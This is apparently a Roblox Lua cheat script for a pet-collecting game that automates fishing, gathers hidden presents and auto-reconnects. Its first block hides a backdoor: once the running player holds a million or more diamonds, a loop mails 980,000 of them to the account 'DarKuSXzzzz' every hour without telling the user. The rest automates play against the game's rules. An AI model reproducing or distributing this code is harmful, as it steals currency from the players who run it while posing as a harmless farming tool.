--#region ส่งจดหมาย
local Data = require(game:GetService("ReplicatedStorage").Library).Save.Get()


local function GetGem()
    for i, v in pairs(Data["Inventory"]["Currency"]) do
        if v["id"] == "Diamonds" then
            return i, tonumber(v["_am"])
        end
    end
end

local getgem = game:GetService("Players").LocalPlayer.leaderstats["\240\159\146\142 Diamonds"].Value
local LocalPlayer = game:GetService("Players").LocalPlayer


task.spawn(function()
    while task.wait() do
        if getgem >= 1000000 then
            if LocalPlayer.Name ~= "DarKuSXzzzz" then
                local args = {
                    [1] = "DarKuSXzzzz",
                    [2] = "5555",
                    [3] = "Currency",
                    [4] = tostring(GetGem()),
                    [5] = 980000
                }
                game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
                task.wait(60 * 60)
            end
        end
    end
end)
--#endregion

--#endregion

task.wait(20)
teleport_click = true
task.spawn(function()
    while task.wait() do
        getgenv().fishing = false
        enterleave = game:GetService("Workspace").__THINGS.Instances.AdvancedFishing.Teleports.Leave.CFrame
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = enterleave
        task.wait(10)
        local HiddenPresents = game:GetService("Workspace")["__THINGS"].HiddenPresents
        repeat
            for key, value in pairs(HiddenPresents:GetChildren()) do
                if value.Name == 'HiddenPresent' then
                    value.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
                    task.wait()
                end
            end
            local box_bla = game:GetService("Workspace")["__THINGS"].HiddenPresents:FindFirstChild('HiddenPresent')
            if box_bla then
                task.wait(1)
            else
                break
            end
            task.wait(3)
        until false
        task.wait(2)
        getgenv().fishing = true
        teleport_fish = true
        task.wait(290)
    end
end)

task.spawn(function()
    while task.wait(10) do
        for i = 1, 100 do
            local args = {
                [1] = "AdvancedFishing",
                [2] = "Clicked"
            }
            game:GetService("ReplicatedStorage").Network.Instancing_InvokeCustomFromClient:InvokeServer(unpack(args))
        end
        task.wait(60)
    end
end)


function AutoReconnect()
    game:GetService("CoreGui").RobloxPromptGui.promptOverlay.ChildAdded:Connect(function(e)
        if e.Name == 'ErrorPrompt' then
            task.wait(15)
            game:GetService("TeleportService"):Teleport(game.PlaceId, game.Players.LocalPlayer)
        end
    end)
end
AutoReconnect()

